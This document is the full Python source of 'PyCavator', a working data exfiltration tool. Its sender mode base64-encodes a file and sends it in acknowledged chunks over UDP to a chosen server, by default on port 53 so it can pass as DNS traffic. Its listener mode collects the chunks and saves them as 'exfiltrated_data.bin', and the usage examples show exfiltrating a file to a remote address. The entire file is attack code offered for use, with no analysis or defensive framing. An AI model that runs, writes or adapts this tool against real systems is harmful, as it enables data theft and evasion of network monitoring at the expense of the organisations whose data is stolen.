import argparse
import socket
import base64
import os
import time

banner = '''
###############################################################
#                                                             #
#              PyCavator - Data Exfiltration                  #
#                                                             #
#                 Created by: Kryptohaker                     #
#                                                             #
###############################################################
'''
print(banner)

def send_data(filename, server, port, interval):
    with open(filename, 'rb') as f:
        data = f.read()
        encoded_data = base64.b64encode(data).decode('utf-8')
        chunk_size = 4096

        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(1)

        i = 0
        while i < len(encoded_data):
            chunk = encoded_data[i:i + chunk_size]
            message = f"{i}-{chunk}".encode('utf-8')
            sock.sendto(message, (server, port))
            print(f"Sent chunk: #{i}")

            try:
                ack, addr = sock.recvfrom(1024)
                if ack.decode('utf-8') == f"ACK-{i}":
                    i += chunk_size
            except socket.timeout:
                print(f"Timeout waiting for ACK. Resending chunk #{i}")

            time.sleep(interval)

        sock.close()

def listen_and_save_data(server, port, output_dir):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind((server, port))
    print(f"Listener started on {server}:{port} and waiting queries...")
    received_data = {}
    expected_chunk_num = 0
    try:
        while True:
            data, addr = sock.recvfrom(4096 + 32)  # 32 bytes for extra index and delimiter
            header, encoded_chunk = data.decode('utf-8').split('-', 1)
            chunk_num = int(header)

            if chunk_num == expected_chunk_num:
                received_data[chunk_num] = encoded_chunk
                print(f"Received chunk: #{chunk_num}")
                expected_chunk_num += len(encoded_chunk)

                sock.sendto(f"ACK-{chunk_num}".encode('utf-8'), addr)

    except KeyboardInterrupt:
        print("Saving received data...")
        decoded_data = base64.b64decode(''.join(received_data.values()))

        output_file = os.path.join(output_dir, 'exfiltrated_data.bin')
        with open(output_file, 'wb') as f:
            f.write(decoded_data)
        print(f"Data saved to {output_file}")

def main():
    # Parse command line arguments
    parser = argparse.ArgumentParser(
        description='PyCavator - UDP Exfiltration Tool',
        epilog='''Examples:
  # Sender mode: exfiltrate data from a file
  python pycavator-udp.py -f input.txt -s 192.168.1.101 -p 53 -i 1 
  
  # Listener mode: listen for incoming data and save to a single file
  python pycavator-udp.py -l -s 192.168.1.101 -p 53 -o /tmp
        ''',
        formatter_class=argparse.RawTextHelpFormatter
    )    
    parser.add_argument("-f", "--file", help="File to exfiltrate")
    parser.add_argument("-s", "--server", help="Target server IP address")
    parser.add_argument("-p", "--port", type=int, default=53, help="Target server port (default: 53)")
    parser.add_argument("-i", "--interval", type=float, default=1, help="Interval between UDP queries (default: 1s)")
    parser.add_argument("-l", "--listen", action="store_true", help="Start listener")
    parser.add_argument("-o", "--output", help="Output directory for received data")

    args = parser.parse_args()

    if args.listen:
        if not args.output:
            parser.error("Output directory is required when using -l/--listen")
        listen_and_save_data(args.server, args.port, args.output)
    else:
        if not args.file or not args.server:
            parser.error("File, and target server are required when not using -l/--listen")
        send_data(args.file, args.server, args.port, args.interval)

if __name__ == "__main__":
    main()
